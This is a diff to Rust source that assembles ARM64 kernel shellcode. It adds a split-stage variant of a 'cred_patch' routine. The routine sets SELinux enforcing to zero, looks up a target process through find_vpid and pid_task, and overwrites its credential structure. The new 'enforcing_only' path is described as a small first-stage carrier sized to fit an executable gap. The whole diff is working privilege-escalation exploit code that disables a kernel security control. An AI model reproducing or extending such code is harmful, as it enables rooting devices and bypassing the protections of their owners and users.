@@ -45,6 +45,13 @@ pub fn build_patch_init(delta: u32) -> [u8; 52] {
 /// SELinux-context=kernel block using cred->security offset.
 pub fn cred_patch(dsel: i64, dfv: i64, dpt: i64, pid: i64, dssuse: i64,
                   enf_off: u32, cred_off: u32, ctx: Option<u32>) -> (Vec<u8>, usize) {
+    cred_patch_ex(dsel, dfv, dpt, pid, dssuse, enf_off, cred_off, ctx, false)
+}
+
+/// enforcing_only=true emits just enforcing=0 + status-sync (no find_vpid/pid_task/cred-patch) — the
+/// small Phase-A carrier for the split flow (fewer diff bytes -> the ctor stub fits a small exec gap).
+pub fn cred_patch_ex(dsel: i64, dfv: i64, dpt: i64, pid: i64, dssuse: i64,
+                     enf_off: u32, cred_off: u32, ctx: Option<u32>, enforcing_only: bool) -> (Vec<u8>, usize) {
     let lo = |v: i64| (v as u32 & 0xffff) as u16;
     let hi = |v: i64| ((v as u32 >> 16) & 0xffff) as u16;
     let mut a = Asm::new();
@@ -70,6 +77,7 @@ pub fn cred_patch(dsel: i64, dfv: i64, dpt: i64, pid: i64, dssuse: i64,
     a.mov_x(0, 2);
     a.mov_x_xzr(1);
     a.blr(4);
+    if !enforcing_only {
     // find_vpid (x20)
     a.movz_w(1, lo(dfv), 0); a.movk_w(1, hi(dfv), 1);
     a.add_x_w_sxtw(20, 19, 1);
@@ -98,6 +106,7 @@ pub fn cred_patch(dsel: i64, dfv: i64, dpt: i64, pid: i64, dssuse: i64,
         a.cbz_x(4, "done");
         a.orr_w_1(5);
         a.stp_w(5, 5, 4, 0);
+    }
     }
     a.label("done");
     a.mov_w_wzr(0);
